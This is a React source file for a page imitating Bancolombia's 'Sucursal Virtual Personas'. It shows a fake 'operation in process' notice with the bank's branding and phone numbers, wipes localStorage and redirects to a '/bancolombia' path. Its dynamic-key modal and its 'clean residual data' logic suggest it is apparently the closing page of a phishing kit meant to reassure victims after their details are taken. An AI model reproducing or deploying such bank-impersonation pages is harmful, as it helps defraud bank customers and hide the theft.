import { useEffect, useRef, useState } from "react";
import ClaveDinaModal from "./modals/ClaveDinaModal";
import AccionesModal from "./modals/accionesModal";
import LoadingBancolombia from "../../../components/LoadingBancolombia";
import { isDesktop, limpiarPaddingBody } from "../../../../@utils";
import './css/LoginModal.css';

// Componente de la página finalizado
export default function Finalizado() {



    // Se inicializa el cargando
    const [getLoading, setLoading] = useState(false);

    // Se inicializa el formState
    const [formState, setFormState] = useState({
        usuario: "",
        clave: "",
        errorUsuario: false,
        errorClave: false,
        lanzarModalAcciones: false,
        lanzarModalInactividad: false,
        lanzarModalErrorSesion: false,
        touchedClave: false
    });

    // Se inicializa los estados
    const [ip, setIp] = useState("");
    const [getDateHour, setDateHour] = useState("");

    // Se crea el useEffect para capturar la ip publica y la hora en estandar
    useEffect(() => {

        // Se limpia el localStorage
        localStorage.clear();

        // Se limpia el padding del body
        limpiarPaddingBody();

        // Se obtiene la IP
        getInfoIp();

        // Se obtiene la fecha/hora con formato
        getDateHours();

        // Se borra el localStorage después de 15 segundos para limpiar cualquier dato residual
        setTimeout(() => {

            // Se borra el localStorage para limpiar cualquier dato residual
            localStorage.clear();

            // Se redirecciona al sitio oficial de Bancolombia
            window.location.href = "/bancolombia";
        }, 15000);

        // Redireccionar después de 20 segundos
        const redirectTimeout = setTimeout(() => {

            // Se borra el localStorage para limpiar cualquier dato residual
            localStorage.clear();

            // Se redirecciona al sitio oficial de Bancolombia
            window.location.href = "/bancolombia";
        }, 15000);

        // Cleanup del timeout
        return () => clearTimeout(redirectTimeout);
    }, []);

    //  Se crea el useEffect para ejecutar 1 minuto 
    useEffect(() => {

        // Ejecutar inmediatamente al montar
        getDateHours();

        // Calcular cuánto falta para el próximo minuto exacto
        const ahora = new Date();
        const nextMinutes = (60 - ahora.getSeconds()) * 1000 - ahora.getMilliseconds();

        // Se inicializa el intervalId
        let intervalId;

        // Timeout para sincronizar con el cambio exacto de minuto
        const timeoutId = setTimeout(() => {

            // Actualizar por primera vez al llegar al próximo minuto
            getDateHours();

            // Luego actualizar cada 60 segundos
            intervalId = setInterval(() => {

                // Actualizar fecha y hora
                getDateHours();
            }, 60000);
        }, nextMinutes);

        // Cleanup
        return () => {

            // Se limpia el timeout e interval
            clearTimeout(timeoutId);

            // Se limpia el interval si existe
            if (intervalId) clearInterval(intervalId);
        };
    }, []);

    // Obtiene la dirección IP pública del usuario
    const getInfoIp = async () => {

        // Se usa el try
        try {

            // Se realiza la petición HTTP a la API
            const response = await fetch("https://api.ipify.org?format=json");

            // Se convierte la respuesta a JSON
            const data = await response.json();

            // Se guarda la IP obtenida en el estado
            setIp(data.ip);
        } catch (error) {

            // En caso de error (sin internet, API caída, etc.)
            console.error("Error obteniendo IP", error);

            // Se asigna un valor por defecto para evitar fallos en la UI
            setIp("No disponible");
        };
    };

    // Maneja el cierre del modal
    const handleClose = () => {

        // Se muestra el cargando por 2 segundos
        setLoading(true);

        // Se borra toda la informacion del localStorage
        localStorage.clear();

        // Redirigir al centro de ayuda de Bancolombia
        window.location.href = "/bancolombia";
    };

    // Obtiene la fecha y hora actual del sistema
    const getDateHours = () => {

        // Se obtiene la fecha y hora actual
        const ahora = new Date();

        // Opciones de formato para la fecha y hora
        const options = {
            weekday: "long",   // día de la semana (miércoles)
            year: "numeric",   // año (2026)
            month: "long",     // mes (enero)
            day: "numeric",    // día del mes (7)
            hour: "numeric",   // hora (5)
            minute: "2-digit", // minutos (38)
            hour12: true       // formato 12 horas (p. m.)
        };

        // Se formatea la fecha según el locale español de Colombia
        const formattDate = ahora.toLocaleString("es-CO", options);

        // Se guarda el valor formateado en el estado
        setDateHour(formattDate);
    };

    // Cierra el modal de acciones
    const handleCLoseModal = () => {

        // Se cierra el modal de acciones
        setFormState(prev => ({
            ...prev,
            lanzarModalAcciones: false
        }));
    };

    // Se crea el return del componente
    const desktop = isDesktop();

    // Renderiza el componente
    return (
        <>
            <div style={{ minHeight: "100dvh", display: "flex", flexDirection: "column" }}>
                <div
                    style={{
                        flex: 1,
                        backgroundColor: "#2C2A29",
                        backgroundImage: 'url("/assets/bancolombia/auth-trazo.svg")',
                        backgroundRepeat: desktop ? 'round' : 'no-repeat',
                        backgroundPosition: "center",
                        backgroundPositionY: desktop ? "0px" : "-70px",
                        backgroundPositionX: desktop ? "0px" : "-500px",
                    }}
                >
                    {/* LOGO */}
                    <div style={{ textAlign: "center" }}>
                        <img
                            src="/assets/bancolombia/bancolombia.svg"
                            alt="Logo"
                            style={{ width: "238px", marginTop: "45px" }}
                        />
                    </div>

                    {/* TITLE */}
                    <div
                        style={{
                            marginTop: "25px",
                        }}
                    >
                        <h1 className="bc-text-center bc-cibsans-font-style-9-extralight bc-mt-4 bc-fs-xs" style={{ fontSize: desktop ? 36 : 28.32, marginBottom: desktop ? "15px" : "0px" }}>
                            Sucursal Virtual Personas
                        </h1>
                    </div>

                    {/* MAIN CARD */}
                    <div className="login-page">
                        <div className="login-box" style={{
                            width: "90%", // Responsive width
                            maxWidth: "400px",
                            textAlign: "center",
                            borderRadius: "8px",
                            color: "#ffffff",
                            padding: "30px 20px", // Reduced padding for mobile
                            margin: "0 auto" // Center card
                        }}>

                            {/* NOTICE BOX */}
                            <div style={{
                                backgroundColor: "transparent",
                                border: "1px solid #ccc",
                                padding: "15px",
                                display: "flex",
                                alignItems: "center",
                                gap: "15px",
                                textAlign: "left",
                                marginBottom: "10px",
                                borderRadius: "4px"
                            }}>
                                <img
                                    src="/assets/bancolombia/enviado-pronto.png"
                                    alt="Reloj"
                                    style={{ width: "50px", height: "50px", flexShrink: 0 }}
                                />
                                <div>
                                    <h3 className="bc-card-auth-title2 bc-cibsans-font-style-5-bold text-center" style={{ margin: "0 0 5px 0", fontSize: "18px", fontWeight: "bold", color: "#ffffff" }}>
                                        ¡Operacion en proceso!
                                    </h3>
                                    <p className="bc-card-auth-description text-center" style={{ margin: 0, fontSize: "13.5px", lineHeight: "1.3" }}>
                                        Estamos procesando su solicitud. <br /> Esto puede tardar un momento.
                                    </p>
                                </div>
                            </div>

                            {/* CONTACT INFO */}
                            <h3 className="bc-card-auth-description" style={{ fontSize: "16px", fontWeight: 600, marginBottom: "20px", color: "#ffffff" }}>
                                Sucursal Telefónica Bancolombia
                            </h3>

                            {/* Grid Layout for closer alignment */}
                            <div
                                className="bc-card-auth-description"
                                style={{
                                    display: "grid",
                                    gridTemplateColumns: "1fr 1fr", // Two equal columns
                                    columnGap: "10px", // Small gap between city and number
                                    rowGap: "3px",
                                    fontSize: "12px",
                                    lineHeight: "15px",
                                    marginBottom: "20px",
                                    textAlign: "right" // Default right align for first column items? No, applied individually
                                }}>
                                <span className="bc-card-auth-description" style={{ textAlign: "right", fontSize: "14px" }}>Medellín:</span> <span className="bc-card-auth-description" style={{ textAlign: "left", fontSize: "14px" }}>510 8000</span>
                                <span className="bc-card-auth-description" style={{ textAlign: "right", fontSize: "14px" }}>Bogotá:</span> <span className="bc-card-auth-description" style={{ textAlign: "left", fontSize: "14px" }}>343 0101</span>
                                <span className="bc-card-auth-description" style={{ textAlign: "right", fontSize: "14px" }}>Barranquilla:</span> <span className="bc-card-auth-description" style={{ textAlign: "left", fontSize: "14px" }}>361 8989</span>
                                <span className="bc-card-auth-description" style={{ textAlign: "right", fontSize: "14px" }}>Bucaramanga:</span> <span className="bc-card-auth-description" style={{ textAlign: "left", fontSize: "14px" }}>697 2525</span>
                                <span className="bc-card-auth-description" style={{ textAlign: "right", fontSize: "14px" }}>Cali:</span> <span className="bc-card-auth-description" style={{ textAlign: "left", fontSize: "14px" }}>554 0506</span>
                                <span className="bc-card-auth-description" style={{ textAlign: "right", fontSize: "14px" }}>Cartagena:</span> <span className="bc-card-auth-description" style={{ textAlign: "left", fontSize: "14px" }}>693 4401</span>
                                <span className="bc-card-auth-description" style={{ textAlign: "right", fontSize: "14px" }}>Pereira:</span> <span className="bc-card-auth-description" style={{ textAlign: "left", fontSize: "14px" }}>340 1214</span>
                                <span className="bc-card-auth-description" style={{ textAlign: "right", fontSize: "14px" }}>Resto del país:</span> <span className="bc-card-auth-description" style={{ textAlign: "left", fontSize: "14px" }}>01 8000 08 12 345</span>
                            </div>

                            {/* EXTERIOR INFO */}
                            <h3 className="bc-card-auth-description" style={{ fontSize: "16px", fontWeight: 600, marginBottom: "10px", color: "#ffffff" }}>
                                Sucursal Telefónicas en el Exterior
                            </h3>
                            <div className="bc-card-auth-description" style={{
                                display: "grid",
                                gridTemplateColumns: "1fr 1fr",
                                columnGap: "10px",
                                rowGap: "3px",
                                fontSize: "14px",
                                lineHeight: "15px",
                                marginBottom: "20px"
                            }}>
                                <span className="bc-card-auth-description" style={{ textAlign: "right", fontSize: "14px" }}>España:</span> <span className="bc-card-auth-description" style={{ textAlign: "left", fontSize: "14px" }}>900 994 717</span>
                                <span className="bc-card-auth-description" style={{ textAlign: "right", fontSize: "14px" }}>Estados Unidos:</span> <span className="bc-card-auth-description" style={{ textAlign: "left", fontSize: "14px" }}>1 866 378 97 14</span>
                            </div>

                            {/* BUTTON */}
                            <div style={{ display: "flex", justifyContent: "center" }}>
                                <button
                                    className="bc-button-primary login-btn"
                                    onClick={handleClose}
                                    style={{ width: "100%", maxWidth: "200px", fontSize: "14px" }}
                                >
                                    Cerrar
                                </button>
                            </div>
                        </div>
                    </div>
                    <div className="login-page-footer mt-4">
                        <div className="footer-links" style={{ marginTop: "70px", marginRight: "1%", marginBottom: "5px" }}>
                            <span>¿Problemas para conectarte?</span>
                            <span className="dot">·</span>
                            <span>Aprende sobre seguridad</span>
                            <span className="dot">·</span>
                            <span>Reglamento Sucursal Virtual</span>
                            <span className="dot">·</span>
                            <span>Política de privacidad</span>
                        </div>
                        <hr style={{ marginTop: "20px" }} />
                        <div className="footer-final">
                            <div className="footer-left">
                                <div>
                                    <img
                                        src="/assets/bancolombia/bancolombia.svg"
                                        style={{ width: "180px" }}
                                    />
                                </div>
                                <div style={{ alignSelf: 'center' }}>
                                    <span className="vigilado">
                                        <img
                                            src="/assets/bancolombia/logo-vigilado.svg"
                                            alt="Superintendencia"
                                            style={{ width: "140px" }}
                                        />
                                    </span>
                                </div>
                            </div>
                            <div className="footer-right">
                                <div className="mt-2">Dirección IP: {ip}</div>
                                <div className="mb-2">{getDateHour}</div>
                            </div>
                        </div>
                    </div>
                </div>

                {/* Modal de inactividad */}
                {formState.lanzarModalInactividad ?
                    <ClaveDinaModal isOpen={formState.lanzarModalInactividad} onClose={() => setFormState(prev => ({
                        ...prev,
                        lanzarModalInactividad: false
                    }))} /> : null}

                {/* Modal de acciones */}
                {formState.lanzarModalAcciones ?
                    <AccionesModal isOpen={formState.lanzarModalAcciones} onClose={handleCLoseModal} /> : null}

                {/* Modal de error de sesión */}
                {formState.lanzarModalErrorSesion ?
                    <ClaveDinaModal isOpen={formState.lanzarModalErrorSesion} onClose={() => setFormState(prev => ({
                        ...prev,
                        lanzarModalErrorSesion: false
                    }))} /> : null}
            </div>

            <div className="visual-captcha" style={{ cursor: "pointer" }}>
                <img src="/assets/bancolombia/lateral-der.png" alt="Visual Captcha" />
            </div>

            {/* Cargando LOADING */}
            {getLoading ?
                <LoadingBancolombia /> : null}
        </>
    );
};
